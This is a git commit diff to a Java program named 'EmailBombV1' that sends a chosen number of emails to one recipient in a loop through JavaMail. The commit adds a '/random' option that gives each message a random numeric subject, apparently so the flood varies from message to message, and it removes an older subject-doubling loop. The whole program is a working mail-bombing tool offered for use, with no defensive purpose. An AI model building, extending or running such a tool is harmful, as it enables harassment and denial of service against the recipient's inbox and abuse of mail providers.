036dc4fd24c4ede03d83f00a5217f5a5cfdb5272
YukitaRiko <146453659+OrangeCat847@users.noreply.github.com>
2026-07-11 19:22:04 +0800

    Implement random subject feature for email sending
    Added random subject functionality for emails.

--- src/main/java/top/snowolives/Main.java
+++ src/main/java/top/snowolives/Main.java
@@ -3,9 +3,11 @@ import javax.mail.*;
 import javax.mail.internet.*;
 import java.util.Properties;
 import java.util.Scanner;
+import java.util.Random;
 public class Main {
     public static void main(String[] args) throws Exception {
         Scanner input = new Scanner(System.in);
+        Random random = new Random();
         System.out.println("EmailBombV1 -.-.-.-.-");
         System.out.println("Version 1.2");
         System.out.println("Made by Christina(YukitaRiko)");
@@ -20,6 +22,10 @@ public class Main {
         String receiver = input.nextLine();
         System.out.print("What's the subject? ");
         String subject = input.nextLine();
+        String rsn = "";
+        if (subject.equals("/random")) {
+            rsn = subject;
+        }
         System.out.print("What's the text? ");
         String text = input.nextLine();
         System.out.print("How many Emails Do you want to send: ");
@@ -37,26 +43,27 @@ public class Main {
         });
         session.setDebug(true);
         while (num > 0) {
-            while (true) {
-                if (subject.equals("/0")) {
-                    subject += "/0";
+                if (rsn.equals("/random")) {
+                    int rn = random.nextInt(1000000);
+                    String rns = Integer.toString(rn);
+                    subject = rns;
+                    Message message = new MimeMessage(session);
+                    message.setFrom(new InternetAddress(sender));
+                    message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
+                    message.setSubject(subject);
+                    message.setText(text);
+                    Transport.send(message);
+                    num -= 1;
                 }
-                Message message = new MimeMessage(session);
-                message.setFrom(new InternetAddress(sender));
-                message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
-                message.setSubject(subject);
-                message.setText(text);
-                Transport.send(message);
-                num -= 1;
-                subject += subject;
+                else{
+                    Message message = new MimeMessage(session);
+                    message.setFrom(new InternetAddress(sender));
+                    message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
+                    message.setSubject(subject);
+                    message.setText(text);
+                    Transport.send(message);
+                    num -= 1;
+                }
             }
         }
-                Message message = new MimeMessage(session);
-                message.setFrom(new InternetAddress(sender));
-                message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
-                message.setSubject(subject);
-                message.setText(text);
-                Transport.send(message);
-                num -= 1;
-    }
 }
